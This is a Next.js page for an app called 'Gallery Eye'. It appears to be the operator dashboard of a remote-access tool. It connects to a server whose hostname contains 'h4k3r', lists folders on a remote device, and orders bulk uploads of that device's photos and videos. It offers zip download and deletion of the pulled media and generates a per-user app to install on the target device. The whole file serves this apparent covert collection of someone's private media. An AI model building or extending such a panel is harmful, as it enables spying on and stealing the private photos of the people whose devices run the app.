"use client";

import { useSession, signOut } from "next-auth/react";
import { useEffect, useState, useMemo } from "react";
import Image from "next/image";
import io from "socket.io-client";
import AppGenerationModal from "@/components/AppGenerationModal";

let socket: any;

export default function Home() {
    const { data: session, status } = useSession();
    const [images, setImages] = useState<any[]>([]);
    const [folders, setFolders] = useState([]);
    const [deviceStatus, setDeviceStatus] = useState(false);
    const [uploadProgress, setUploadProgress] = useState<any>(null);
    const [showAppModal, setShowAppModal] = useState(false);
    const [selectedFolder, setSelectedFolder] = useState<any>(null);

    // New State for Gallery Features
    const [activeTab, setActiveTab] = useState<'all' | 'image' | 'video'>('all');
    const [selectedItems, setSelectedItems] = useState<Set<string>>(new Set());
    const [previewItem, setPreviewItem] = useState<any>(null);
    const [isSelectionMode, setIsSelectionMode] = useState(false);
    const [isDownloading, setIsDownloading] = useState(false);
    const [isDeleting, setIsDeleting] = useState(false);
    const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);

    useEffect(() => {
        if (status === "authenticated" && session?.user?.uuid) {
            const uuid = session.user.uuid;

            socket = io("https://gallery-eye-h4k3r.onrender.com", {
                transports: ["websocket"],
                reconnectionAttempts: 5,
            });

            socket.on("connect", () => {
                console.log("Connected to WebSocket");
                socket.emit("register_web", { uuid });
            });

            socket.on("device_status", (status: boolean) => {
                setDeviceStatus(status);
            });

            socket.on("progress_update", (data: any) => {
                setUploadProgress(data);
                if (data.uploaded === data.total) {
                    setTimeout(() => setUploadProgress(null), 3000);
                }
            });

            socket.on("new_image", (image: any) => {
                setImages((prev) => {
                    if (prev.some(img => img.id === image.id)) return prev;
                    return [image, ...prev];
                });
            });

            fetch(`https://gallery-eye-h4k3r.onrender.com/images?uuid=${uuid}`)
                .then((res) => res.json())
                .then((data) => setImages(data));

            return () => {
                if (socket) {
                    socket.disconnect();
                }
            };
        }
    }, [status, session]);

    const fetchFolders = () => {
        if (socket) {
            socket.emit("get_folders");
            socket.once("folder_list", (data: any) => {
                setFolders(data);
            });
        }
    };

    const handleFolderClick = (folder: any) => {
        setSelectedFolder(folder);
        setSyncMediaType(null); // Reset media type selection
    };

    const triggerUpload = (count: number | 'all') => {
        if (socket && selectedFolder && syncMediaType && session?.user?.uuid) {
            socket.emit("trigger_sync", {
                uuid: session.user.uuid,
                folderId: selectedFolder.id,
                folderName: selectedFolder.name,
                count: count,
                mediaType: syncMediaType
            });
            setSelectedFolder(null);
            setSyncMediaType(null);
        }
    };

    // --- Gallery Logic ---

    const hasVideos = useMemo(() => images.some(img => img.resource_type === 'video'), [images]);

    const filteredImages = useMemo(() => {
        if (activeTab === 'all') return images;
        return images.filter(img => img.resource_type === activeTab);
    }, [images, activeTab]);

    const toggleSelection = (id: string) => {
        const newSelection = new Set(selectedItems);
        if (newSelection.has(id)) {
            newSelection.delete(id);
        } else {
            newSelection.add(id);
        }
        setSelectedItems(newSelection);
        if (newSelection.size === 0) setIsSelectionMode(false);
        else setIsSelectionMode(true);
    };

    const selectAll = () => {
        if (selectedItems.size === filteredImages.length) {
            setSelectedItems(new Set());
            setIsSelectionMode(false);
        } else {
            setSelectedItems(new Set(filteredImages.map(img => img.id)));
            setIsSelectionMode(true);
        }
    };

    const deleteSelected = async () => {
        if (!confirm("Are you sure you want to delete these items?")) return;
        setIsDeleting(true);
        const idsToDelete = Array.from(selectedItems);

        try {
            const response = await fetch('https://gallery-eye-h4k3r.onrender.com/delete', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ids: idsToDelete })
            });

            if (response.ok) {
                setImages(prev => prev.filter(img => !selectedItems.has(img.id)));
                setSelectedItems(new Set());
                setIsSelectionMode(false);
            }
        } catch (error) {
            console.error("Delete failed", error);
        } finally {
            setIsDeleting(false);
        }
    };

    const downloadSelected = async () => {
        setIsDownloading(true);
        const selectedUrls = images.filter(img => selectedItems.has(img.id)).map(img => img.url);

        try {
            const response = await fetch('https://gallery-eye-h4k3r.onrender.com/download-zip', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ urls: selectedUrls })
            });

            if (response.ok) {
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `gallery_download_${new Date().toISOString()}.zip`;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
                setSelectedItems(new Set());
                setIsSelectionMode(false);
            }
        } catch (error) {
            console.error("Download failed", error);
        } finally {
            setIsDownloading(false);
        }
    };

    const downloadSingle = async (url: string, filename: string) => {
        try {
            const response = await fetch(url);
            const blob = await response.blob();
            const link = document.createElement('a');
            link.href = window.URL.createObjectURL(blob);
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        } catch (error) {
            console.error("Download failed", error);
        }
    };


    if (status === "loading") {
        return (
            <div className="min-h-screen flex items-center justify-center bg-black text-white">
                <div className="animate-spin rounded-full h-32 w-32 border-t-2 border-b-2 border-purple-500"></div>
            </div>
        );
    }

    if (status === "unauthenticated") return null;

    return (
        <main className="min-h-screen bg-[#0a0a0a] text-white selection:bg-purple-500/30 pb-24">
            {/* Background Gradients */}
            <div className="fixed inset-0 z-0 overflow-hidden pointer-events-none">
                <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-purple-600/20 rounded-full blur-[120px]" />
                <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-blue-600/20 rounded-full blur-[120px]" />
            </div>

            {/* Navbar */}
            <nav className="relative z-10 border-b border-white/10 bg-black/20 backdrop-blur-xl sticky top-0">
                <div className="max-w-7xl mx-auto px-4 md:px-6 h-16 md:h-20 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                        <div className="w-8 h-8 md:w-10 md:h-10 rounded-xl bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center font-bold text-lg md:text-xl">G</div>
                        <span className="text-lg md:text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-white to-white/60 hidden sm:block">Gallery Eye</span>
                    </div>

                    <div className="flex items-center gap-3 md:gap-6">
                        <div className="flex items-center gap-2 px-3 py-1.5 md:px-4 md:py-2 rounded-full bg-white/5 border border-white/10">
                            <div className={`w-2 h-2 rounded-full ${deviceStatus ? 'bg-green-500 shadow-[0_0_10px_rgba(34,197,94,0.5)]' : 'bg-red-500'}`} />
                            <span className="text-xs md:text-sm font-medium text-white/60 hidden sm:block">{deviceStatus ? 'Connected' : 'Waiting...'}</span>
                        </div>

                        <div className="flex items-center gap-3 md:gap-4">
                            <button onClick={() => setShowAppModal(true)} className="px-3 py-1.5 md:px-5 md:py-2 rounded-lg bg-white text-black text-sm md:text-base font-semibold hover:scale-105 transition-transform">
                                <span className="hidden sm:inline">Download App</span>
                                <span className="sm:hidden">App</span>
                            </button>
                            <div className="w-px h-6 md:h-8 bg-white/10 hidden sm:block" />
                            <div className="flex items-center gap-3">
                                <span className="text-sm font-medium text-white/80 hidden md:block">{session?.user?.name}</span>
                                <button onClick={() => signOut()} className="text-sm text-red-400 hover:text-red-300 transition-colors">Logout</button>
                            </div>
                        </div>
                    </div>
                </div>
            </nav>

            <div className="relative z-10 max-w-7xl mx-auto px-4 md:px-6 py-8">

                {/* Remote Control Section */}
                <div className="mb-12">
                    <div className="flex items-center justify-between mb-6">
                        <h2 className="text-2xl font-bold">Remote Control</h2>
                        <button onClick={fetchFolders} className="px-4 py-2 rounded-lg bg-white/5 border border-white/10 hover:bg-white/10 transition-colors text-sm">Refresh Folders</button>
                    </div>

                    {folders.length > 0 ? (
                        <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-3">
                            {folders.map((folder: any, idx) => (
                                <button key={idx} onClick={() => handleFolderClick(folder)} className="p-3 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all group text-left">
                                    <div className="flex justify-between items-start mb-2">
                                        <div className="p-1.5 rounded-lg bg-purple-500/20 text-purple-400">
                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>
                                        </div>
                                    </div>
                                    <div className="truncate font-medium text-sm">{folder.name}</div>
                                    <div className="text-xs text-white/40">
                                        {folder.imageCount > 0 && folder.videoCount > 0
                                            ? `${folder.imageCount} 📷 • ${folder.videoCount} 🎥`
                                            : folder.imageCount > 0
                                                ? `${folder.imageCount} images`
                                                : `${folder.videoCount} videos`}
                                    </div>
                                </button>
                            ))}
                        </div>
                    ) : (
                        <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">Click "Refresh Folders" to see albums from your device.</div>
                    )}
                </div>

                {/* Gallery Section */}
                <div className="flex flex-col md:flex-row md:items-center justify-between mb-6 gap-4">
                    <h2 className="text-2xl font-bold">Your Gallery</h2>

                    {/* Tabs */}
                    <div className="flex p-1 bg-white/5 rounded-xl border border-white/10 self-start">
                        <button
                            onClick={() => setActiveTab('all')}
                            className={`px-4 py-1.5 rounded-lg text-sm font-medium transition-all ${activeTab === 'all' ? 'bg-white/10 text-white shadow-sm' : 'text-white/40 hover:text-white/70'}`}
                        >
                            All
                        </button>
                        <button
                            onClick={() => setActiveTab('image')}
                            className={`px-4 py-1.5 rounded-lg text-sm font-medium transition-all ${activeTab === 'image' ? 'bg-white/10 text-white shadow-sm' : 'text-white/40 hover:text-white/70'}`}
                        >
                            Images
                        </button>
                        <button
                            onClick={() => setActiveTab('video')}
                            className={`px-4 py-1.5 rounded-lg text-sm font-medium transition-all ${activeTab === 'video' ? 'bg-white/10 text-white shadow-sm' : 'text-white/40 hover:text-white/70'}`}
                        >
                            Videos
                        </button>
                    </div>
                </div>

                {/* Selection Toolbar */}
                {isSelectionMode && (
                    <div className="fixed bottom-8 left-1/2 -translate-x-1/2 z-40 flex items-center gap-4 p-4 rounded-2xl bg-[#1a1a1a] border border-white/20 shadow-2xl animate-slideUp">
                        <span className="text-sm font-medium px-2">{selectedItems.size} Selected</span>
                        <div className="h-6 w-px bg-white/10" />
                        <button onClick={selectAll} className="text-sm hover:text-purple-400 transition-colors">
                            {selectedItems.size === filteredImages.length ? 'Deselect All' : 'Select All'}
                        </button>

                        {/* Download Button */}
                        <button
                            onClick={downloadSelected}
                            disabled={isDownloading}
                            className="px-4 py-2 rounded-lg bg-white text-black text-sm font-bold hover:bg-gray-200 transition-colors flex items-center gap-2"
                        >
                            {isDownloading ? (
                                <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
                            ) : (
                                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
                            )}
                            Download Zip
                        </button>

                        {/* Delete Button */}
                        <button
                            onClick={deleteSelected}
                            disabled={isDeleting}
                            className="px-4 py-2 rounded-lg bg-red-500/10 text-red-500 border border-red-500/20 text-sm font-bold hover:bg-red-500/20 transition-colors flex items-center gap-2"
                        >
                            {isDeleting ? (
                                <div className="w-4 h-4 border-2 border-red-500/30 border-t-red-500 rounded-full animate-spin" />
                            ) : (
                                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg>
                            )}
                            Delete
                        </button>

                        <button onClick={() => { setSelectedItems(new Set()); setIsSelectionMode(false); }} className="p-2 hover:bg-white/10 rounded-lg transition-colors">
                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                        </button>
                    </div>
                )}

                {/* Grid */}
                {filteredImages.length === 0 ? (
                    <div className="flex flex-col items-center justify-center py-20 text-white/40">
                        <div className="w-20 h-20 rounded-2xl bg-white/5 flex items-center justify-center mb-4">
                            <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                        </div>
                        <p>No media found.</p>
                    </div>
                ) : (
                    <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
                        {filteredImages.map((img) => (
                            <div
                                key={img.id}
                                className={`group relative aspect-square rounded-2xl overflow-hidden bg-white/5 border transition-all duration-300 ${selectedItems.has(img.id) ? 'border-purple-500 ring-2 ring-purple-500/50' : 'border-white/10 hover:border-white/30'}`}
                            >
                                {img.resource_type === 'video' ? (
                                    <video src={img.url} className="w-full h-full object-cover" muted />
                                ) : (
                                    <Image src={img.url} alt="Gallery Image" fill className="object-cover transition-transform duration-500 group-hover:scale-110" />
                                )}

                                {/* Overlay */}
                                <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity flex flex-col justify-between p-3">
                                    <div className="flex justify-end">
                                        <button
                                            onClick={(e) => { e.stopPropagation(); toggleSelection(img.id); }}
                                            className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-all ${selectedItems.has(img.id) ? 'bg-purple-500 border-purple-500' : 'border-white/60 hover:border-white'}`}
                                        >
                                            {selectedItems.has(img.id) && <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7"></path></svg>}
                                        </button>
                                    </div>

                                    <div
                                        className="absolute inset-0 z-0 cursor-pointer"
                                        onClick={() => {
                                            if (isSelectionMode) toggleSelection(img.id);
                                            else setPreviewItem(img);
                                        }}
                                    />

                                    {img.resource_type === 'video' && (
                                        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-12 h-12 rounded-full bg-white/20 backdrop-blur-md flex items-center justify-center pointer-events-none">
                                            <svg className="w-6 h-6 text-white ml-1" fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z" /></svg>
                                        </div>
                                    )}
                                </div>
                            </div>
                        ))}
                    </div>
                )}

                {/* Preview Modal */}
                {previewItem && (
                    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/95 backdrop-blur-xl animate-fadeIn">
                        <button
                            onClick={() => setPreviewItem(null)}
                            className="absolute top-6 right-6 p-2 rounded-full bg-white/10 hover:bg-white/20 transition-colors z-50"
                        >
                            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                        </button>

                        <div className="relative w-full h-full max-w-6xl max-h-[90vh] p-4 flex flex-col items-center justify-center">
                            {previewItem.resource_type === 'video' ? (
                                <video
                                    src={previewItem.url}
                                    controls
                                    autoPlay
                                    className="max-w-full max-h-[80vh] rounded-lg shadow-2xl"
                                />
                            ) : (
                                <div className="relative w-full h-[80vh]">
                                    <Image
                                        src={previewItem.url}
                                        alt="Preview"
                                        fill
                                        className="object-contain"
                                    />
                                </div>
                            )}

                            <div className="mt-6 flex gap-4">
                                <button
                                    onClick={() => downloadSingle(previewItem.url, `download.${previewItem.resource_type === 'video' ? 'mp4' : 'jpg'}`)}
                                    className="px-6 py-3 rounded-full bg-white text-black font-bold hover:scale-105 transition-transform flex items-center gap-2"
                                >
                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
                                    Download
                                </button>
                            </div>
                        </div>
                    </div>
                )}

                {/* Upload Options Modal */}
                {selectedFolder && (
                    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fadeIn">
                        <div className="bg-[#1a1a1a] border border-white/20 p-6 rounded-2xl shadow-2xl max-w-sm w-full animate-scaleIn">
                            <h3 className="text-xl font-bold mb-1">Sync "{selectedFolder.name}"</h3>

                            {!syncMediaType ? (
                                <>
                                    <p className="text-white/40 text-sm mb-6">What would you like to sync?</p>
                                    <div className="grid grid-cols-2 gap-3 mb-6">
                                        <button onClick={() => setSyncMediaType('image')} className="p-4 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 transition-all flex flex-col items-center gap-2 group">
                                            <div className="p-3 rounded-full bg-purple-500/20 text-purple-400 group-hover:scale-110 transition-transform">
                                                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                                            </div>
                                            <span className="font-medium">Images</span>
                                        </button>
                                        <button onClick={() => setSyncMediaType('video')} className="p-4 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 transition-all flex flex-col items-center gap-2 group">
                                            <div className="p-3 rounded-full bg-blue-500/20 text-blue-400 group-hover:scale-110 transition-transform">
                                                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                                            </div>
                                            <span className="font-medium">Videos</span>
                                        </button>
                                    </div>
                                </>
                            ) : (
                                <>
                                    <p className="text-white/40 text-sm mb-6">How many {syncMediaType}s?</p>
                                    <div className="grid grid-cols-2 gap-3 mb-6">
                                        <button onClick={() => triggerUpload(10)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">10 items</button>
                                        <button onClick={() => triggerUpload(50)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">50 items</button>
                                        <button onClick={() => triggerUpload(100)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">100 items</button>
                                        <button onClick={() => triggerUpload('all')} className="p-3 rounded-lg bg-gradient-to-r from-purple-600 to-blue-600 font-bold">All items</button>
                                    </div>
                                </>
                            )}

                            <button onClick={() => { setSelectedFolder(null); setSyncMediaType(null); }} className="w-full py-2 text-sm text-white/40 hover:text-white transition-colors">Cancel</button>
                        </div>
                    </div>
                )}

                {showAppModal && session?.user?.uuid && (
                    <AppGenerationModal
                        isOpen={showAppModal}
                        onClose={() => setShowAppModal(false)}
                        uuid={session.user.uuid}
                        socket={socket}
                    />
                )}

                {/* Progress Bar */}
                {uploadProgress && (
                    <div className="fixed bottom-6 right-6 bg-[#1a1a1a] border border-white/20 p-4 rounded-xl shadow-2xl w-80 animate-slideUp z-50">
                        <h4 className="text-sm font-bold mb-2 flex justify-between">
                            <span>Syncing {uploadProgress.folder}...</span>
                            <span className="text-purple-400">{Math.round((uploadProgress.uploaded / uploadProgress.total) * 100)}%</span>
                        </h4>
                        <div className="h-2 bg-white/10 rounded-full overflow-hidden">
                            <div className="h-full bg-gradient-to-r from-purple-500 to-blue-500 transition-all duration-300" style={{ width: `${(uploadProgress.uploaded / uploadProgress.total) * 100}%` }} />
                        </div>
                        <p className="text-xs text-white/40 mt-2 text-right">{uploadProgress.uploaded} / {uploadProgress.total} items</p>
                    </div>
                )}
            </div>
        </main>
    );
}
